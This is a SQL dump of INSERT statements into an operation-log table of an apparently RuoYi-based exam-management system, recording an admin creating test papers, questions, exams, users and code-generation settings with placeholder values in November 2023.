INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (423, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":86,\"score\":2},{\"id\":3,\"score\":2},{\"id\":1,\"score\":2},{\"id\":97,\"score\":2},{\"id\":118,\"score\":2},{\"id\":95,\"score\":2},{\"id\":27,\"score\":2},{\"id\":33,\"score\":2},{\"id\":30,\"score\":2},{\"id\":32,\"score\":2},{\"id\":2,\"score\":2},{\"id\":29,\"score\":2},{\"id\":28,\"score\":2},{\"id\":31,\"score\":2},{\"id\":4,\"score\":2}],\"completionProgramList\":[],\"paperName\":\"123\",\"readProgramList\":[],\"remark\":\"12\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 17:09:43', 7);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (424, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":30,\"score\":12},{\"id\":4,\"score\":12}],\"completionProgramList\":[],\"paperName\":\"21\",\"readProgramList\":[],\"remark\":\"2\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 17:09:57', 5);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (425, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":3,\"score\":9},{\"id\":31,\"score\":9},{\"id\":29,\"score\":9},{\"id\":33,\"score\":9},{\"id\":27,\"score\":9},{\"id\":1,\"score\":9},{\"id\":30,\"score\":9},{\"id\":86,\"score\":9},{\"id\":4,\"score\":9},{\"id\":95,\"score\":9}],\"completionProgramList\":[],\"paperName\":\"12\",\"readProgramList\":[{\"id\":82,\"score\":10,\"scoreList\":{\"83\":10}}],\"remark\":\"3\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 19:56:56', 106);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (426, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":28,\"score\":10},{\"id\":86,\"score\":10},{\"id\":2,\"score\":10},{\"id\":33,\"score\":10},{\"id\":95,\"score\":10},{\"id\":29,\"score\":10},{\"id\":32,\"score\":10},{\"id\":1,\"score\":20},{\"id\":118,\"score\":10}],\"completionProgramList\":[],\"paperName\":\"123\",\"readProgramList\":[],\"remark\":\"1\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 19:59:19', 87);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (427, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":4,\"score\":100}],\"completionProgramList\":[],\"paperName\":\"121111\",\"readProgramList\":[],\"remark\":\"3\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 19:59:55', 27);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (428, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[],\"completionProgramList\":[],\"paperName\":\"12\",\"readProgramList\":[{\"id\":5,\"score\":100,\"scoreList\":{\"92\":95,\"100\":1,\"101\":1,\"102\":1,\"103\":1,\"104\":1}}],\"remark\":\"aa\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-02 21:32:54', 47);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (429, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"12\",\"choiceB\":\"12\",\"choiceC\":\"12\",\"choiceD\":\"21\",\"correctAnswer\":\"A\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 08:45:08\",\"exerciseTitle\":\"<p>123</p>\",\"exerciseType\":0,\"id\":120,\"params\":{},\"parentId\":82,\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":120}', 0, NULL, '2023-11-03 08:45:08', 48);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (430, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"12\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 08:45:27\",\"exerciseTitle\":\"<p>213</p>\",\"exerciseType\":1,\"id\":121,\"params\":{},\"parentId\":82,\"quesType\":1}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":121}', 0, NULL, '2023-11-03 08:45:27', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (431, '试卷管理', 1, 'com.ruoyi.project.csp.controller.TbPaperController.save()', 'POST', 1, 'admin', NULL, '/dataControl/paper/save', '127.0.0.1', '内网IP', '{\"baseExerciseList\":[{\"id\":33,\"score\":5},{\"id\":118,\"score\":5},{\"id\":86,\"score\":5},{\"id\":27,\"score\":5},{\"id\":3,\"score\":5},{\"id\":2,\"score\":5},{\"id\":32,\"score\":5},{\"id\":30,\"score\":5},{\"id\":29,\"score\":5},{\"id\":95,\"score\":5}],\"completionProgramList\":[{\"id\":73,\"score\":20,\"scoreList\":{\"74\":20}}],\"paperName\":\"测试试卷展示\",\"readProgramList\":[{\"id\":5,\"score\":30,\"scoreList\":{\"92\":5,\"100\":5,\"101\":5,\"102\":5,\"103\":5,\"104\":5}}],\"remark\":\"123321\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 08:49:58', 119);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (432, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-03 08:52:14\",\"exerciseProgram\":\"<p>123</p>\",\"exerciseType\":-1,\"id\":122,\"params\":{},\"quesType\":2,\"remark\":\"12\"}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":122}', 0, NULL, '2023-11-03 08:52:14', 19);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (433, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"\",\"choiceA\":\"\",\"choiceB\":\"\",\"choiceC\":\"\",\"choiceD\":\"\",\"correctAnswer\":\"正确\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 08:53:02\",\"exerciseTitle\":\"<p>123</p>\",\"exerciseType\":1,\"id\":123,\"params\":{},\"parentId\":122,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":123}', 0, NULL, '2023-11-03 08:53:02', 30);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (434, '题目管理', 1, 'com.ruoyi.project.csp.controller.ExerciseController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exercise', '127.0.0.1', '内网IP', '{\"analysis\":\"1\",\"choiceA\":\"2\",\"choiceB\":\"3\",\"choiceC\":\"1\",\"choiceD\":\"2\",\"correctAnswer\":\"B\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 08:53:22\",\"exerciseTitle\":\"<p>32</p>\",\"exerciseType\":0,\"id\":124,\"params\":{},\"parentId\":122,\"quesType\":2}', '{\"msg\":\"操作成功\",\"code\":200,\"data\":124}', 0, NULL, '2023-11-03 08:53:22', 24);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (435, '代码生成', 3, 'com.ruoyi.project.tool.gen.controller.GenController.remove()', 'DELETE', 1, 'admin', NULL, '/tool/gen/5', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 14:07:02', 63);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (436, '代码生成', 3, 'com.ruoyi.project.tool.gen.controller.GenController.remove()', 'DELETE', 1, 'admin', NULL, '/tool/gen/6', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 14:07:06', 46);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (437, '代码生成', 3, 'com.ruoyi.project.tool.gen.controller.GenController.remove()', 'DELETE', 1, 'admin', NULL, '/tool/gen/4', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 14:07:08', 21);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (438, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_exam\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 14:07:39', 116);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (439, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exam\",\"className\":\"TbExam\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":55,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"ExamName\",\"columnComment\":\"考试名称\",\"columnId\":56,\"columnName\":\"exam_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"examName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"PaperId\",\"columnComment\":\"试卷id\",\"columnId\":57,\"columnName\":\"paper_id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"paperId\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"usableColumn\":false},{\"capJavaField\":\"PaperName\",\"columnComment\":\"试卷名称\",\"columnId\":58,\"columnName\":\"paper_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"paperName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 14:13:21', 106);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (440, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exam\",\"className\":\"TbExam\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":55,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"updateTime\":\"2023-11-03 14:13:21\",\"usableColumn\":false},{\"capJavaField\":\"ExamName\",\"columnComment\":\"考试名称\",\"columnId\":56,\"columnName\":\"exam_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"javaField\":\"examName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":false,\"sort\":2,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"updateTime\":\"2023-11-03 14:13:21\",\"usableColumn\":false},{\"capJavaField\":\"PaperId\",\"columnComment\":\"试卷id\",\"columnId\":57,\"columnName\":\"paper_id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"javaField\":\"paperId\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":3,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"updateTime\":\"2023-11-03 14:13:21\",\"usableColumn\":false},{\"capJavaField\":\"PaperName\",\"columnComment\":\"试卷名称\",\"columnId\":58,\"columnName\":\"paper_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 14:15:36', 65);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (441, '代码生成', 8, 'com.ruoyi.project.tool.gen.controller.GenController.batchGenCode()', 'GET', 1, 'admin', NULL, '/tool/gen/batchGenCode', '127.0.0.1', '内网IP', '{\"tables\":\"tb_exam\"}', NULL, 0, NULL, '2023-11-03 14:15:59', 81);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (442, '菜单管理', 2, 'com.ruoyi.project.system.controller.SysMenuController.edit()', 'PUT', 1, 'admin', NULL, '/system/menu', '127.0.0.1', '内网IP', '{\"children\":[],\"component\":\"dataControl/exam/index\",\"createTime\":\"2023-11-03 14:17:53\",\"icon\":\"edit\",\"isCache\":\"0\",\"isFrame\":\"1\",\"menuId\":2028,\"menuName\":\"考试管理\",\"menuType\":\"C\",\"orderNum\":1,\"params\":{},\"parentId\":2009,\"path\":\"exam\",\"perms\":\"dataControl:exam:list\",\"status\":\"0\",\"updateBy\":\"admin\",\"visible\":\"0\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 14:23:30', 48);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (443, '代码生成', 2, 'com.ruoyi.project.tool.gen.controller.GenController.editSave()', 'PUT', 1, 'admin', NULL, '/tool/gen', '127.0.0.1', '内网IP', '{\"businessName\":\"exam\",\"className\":\"TbExam\",\"columns\":[{\"capJavaField\":\"Id\",\"columnComment\":\"主键\",\"columnId\":55,\"columnName\":\"id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":false,\"htmlType\":\"input\",\"increment\":true,\"insert\":true,\"isIncrement\":\"1\",\"isInsert\":\"1\",\"isPk\":\"1\",\"javaField\":\"id\",\"javaType\":\"Long\",\"list\":false,\"params\":{},\"pk\":true,\"query\":false,\"queryType\":\"EQ\",\"required\":false,\"sort\":1,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"updateTime\":\"2023-11-03 14:15:36\",\"usableColumn\":false},{\"capJavaField\":\"ExamName\",\"columnComment\":\"考试名称\",\"columnId\":56,\"columnName\":\"exam_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"1\",\"isRequired\":\"1\",\"javaField\":\"examName\",\"javaType\":\"String\",\"list\":true,\"params\":{},\"pk\":false,\"query\":true,\"queryType\":\"LIKE\",\"required\":true,\"sort\":2,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"updateTime\":\"2023-11-03 14:15:36\",\"usableColumn\":false},{\"capJavaField\":\"PaperId\",\"columnComment\":\"试卷id\",\"columnId\":57,\"columnName\":\"paper_id\",\"columnType\":\"bigint\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"isInsert\":\"1\",\"isList\":\"1\",\"isPk\":\"0\",\"isQuery\":\"0\",\"isRequired\":\"1\",\"javaField\":\"paperId\",\"javaType\":\"Long\",\"list\":true,\"params\":{},\"pk\":false,\"query\":false,\"queryType\":\"EQ\",\"required\":true,\"sort\":3,\"superColumn\":false,\"tableId\":7,\"updateBy\":\"\",\"updateTime\":\"2023-11-03 14:15:36\",\"usableColumn\":false},{\"capJavaField\":\"PaperName\",\"columnComment\":\"试卷名称\",\"columnId\":58,\"columnName\":\"paper_name\",\"columnType\":\"varchar(128)\",\"createBy\":\"admin\",\"createTime\":\"2023-11-03 14:07:39\",\"dictType\":\"\",\"edit\":true,\"htmlType\":\"input\",\"increment\":false,\"insert\":true,\"isEdit\":\"1\",\"isIncrement\":\"0\",\"', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 14:24:40', 97);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (444, '考试管理', 1, 'com.ruoyi.project.csp.controller.TbExamController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exam', '127.0.0.1', '内网IP', '{\"createTime\":\"2023-11-03 14:53:56\",\"duration\":32,\"examName\":\"考试1\",\"id\":1,\"paperId\":7,\"params\":{}}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 14:53:56', 104);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (445, '用户管理', 1, 'com.ruoyi.project.system.controller.SysUserController.add()', 'POST', 1, 'admin', NULL, '/system/user', '127.0.0.1', '内网IP', '{\"admin\":false,\"createBy\":\"admin\",\"deptId\":200,\"nickName\":\"小王\",\"params\":{},\"postIds\":[],\"roleIds\":[101],\"sex\":\"0\",\"status\":\"0\",\"userId\":101,\"userName\":\"xiaowang\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 15:03:57', 142);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (446, '用户管理', 1, 'com.ruoyi.project.system.controller.SysUserController.add()', 'POST', 1, 'admin', NULL, '/system/user', '127.0.0.1', '内网IP', '{\"admin\":false,\"createBy\":\"admin\",\"deptId\":200,\"nickName\":\"小刘\",\"params\":{},\"postIds\":[],\"roleIds\":[101],\"sex\":\"0\",\"status\":\"0\",\"userId\":102,\"userName\":\"xiaoliu\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 15:06:13', 135);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (447, '用户管理', 1, 'com.ruoyi.project.system.controller.SysUserController.add()', 'POST', 1, 'admin', NULL, '/system/user', '127.0.0.1', '内网IP', '{\"admin\":false,\"createBy\":\"admin\",\"deptId\":200,\"nickName\":\"小李\",\"params\":{},\"postIds\":[],\"roleIds\":[101],\"status\":\"0\",\"userId\":103,\"userName\":\"xiaoli\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 15:07:16', 130);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (448, '考试管理', 1, 'com.ruoyi.project.csp.controller.TbExamController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exam', '127.0.0.1', '内网IP', '{\"createTime\":\"2023-11-03 15:55:18\",\"duration\":12,\"examName\":\"12\",\"id\":2,\"paperId\":2,\"params\":{}}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 15:55:18', 221);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (449, '代码生成', 6, 'com.ruoyi.project.tool.gen.controller.GenController.importTableSave()', 'POST', 1, 'admin', NULL, '/tool/gen/importTable', '127.0.0.1', '内网IP', '{\"tables\":\"tb_exam_user\"}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 16:03:03', 116);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (450, '考试管理', 1, 'com.ruoyi.project.csp.controller.TbExamController.add()', 'POST', 1, 'admin', NULL, '/dataControl/exam', '127.0.0.1', '内网IP', '{\"createBy\":\"admin\",\"createTime\":\"2023-11-03 16:20:08\",\"duration\":123,\"examName\":\"123\",\"id\":3,\"isDelete\":0,\"paperId\":3,\"params\":{},\"users\":[102,101]}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 16:20:08', 49);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (451, '考试管理', 3, 'com.ruoyi.project.csp.controller.TbExamController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exam/1', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 16:28:20', 46);
INSERT INTO `sys_oper_log` (`oper_id`, `title`, `business_type`, `method`, `request_method`, `operator_type`, `oper_name`, `dept_name`, `oper_url`, `oper_ip`, `oper_location`, `oper_param`, `json_result`, `status`, `error_msg`, `oper_time`, `cost_time`) VALUES (452, '考试管理', 3, 'com.ruoyi.project.csp.controller.TbExamController.remove()', 'DELETE', 1, 'admin', NULL, '/dataControl/exam/2', '127.0.0.1', '内网IP', '{}', '{\"msg\":\"操作成功\",\"code\":200}', 0, NULL, '2023-11-03 16:28:24', 10);
